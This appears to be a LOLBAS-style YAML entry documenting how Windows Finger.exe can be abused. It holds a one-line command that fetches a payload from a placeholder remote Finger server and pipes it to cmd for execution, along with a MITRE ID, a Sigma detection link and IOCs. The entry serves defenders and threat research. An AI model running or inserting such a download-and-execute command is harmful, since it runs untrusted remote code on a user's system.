---
Name: Finger.exe
Description: Displays information about a user or users on a specified remote computer that is running the Finger service or daemon
Author: Ruben Revuelta
Created: 2021-08-30
Commands:
  - Command: finger user@example.host.com | more +2 | cmd
    Description: 'Downloads payload from remote Finger server. This example connects to "example.host.com" asking for user "user"; the result could contain malicious shellcode which is executed by the cmd process.'
    Usecase: Download malicious payload
    Category: Download
    Privileges: User
    MitreID: T1105
    OperatingSystem: Windows 8.1, Windows 10, Windows 11, Windows Server 2008, Windows Server 2008R2, Windows Server 2012, Windows Server 2012R2, Windows Server 2016, Windows Server 2019, Windows Server 2022
Full_Path:
  - Path: c:\windows\system32\finger.exe
  - Path: c:\windows\syswow64\finger.exe
Detection:
  - Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_susp_finger_usage.yml
  - IOC: finger.exe should not be run on a normal workstation.
  - IOC: finger.exe connecting to external resources.
Resources:
  - Link: https://twitter.com/DissectMalware/status/997340270273409024
  - Link: https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/ff961508(v=ws.11)
Acknowledgement:
  - Person: Ruben Revuelta (MAPFRE CERT)
    Handle: '@rubn_RB'
  - Person: Jose A. Jimenez (MAPFRE CERT)
    Handle: '@Ocelotty6669'
  - Person: Malwrologist
    Handle: '@DissectMalware'
---
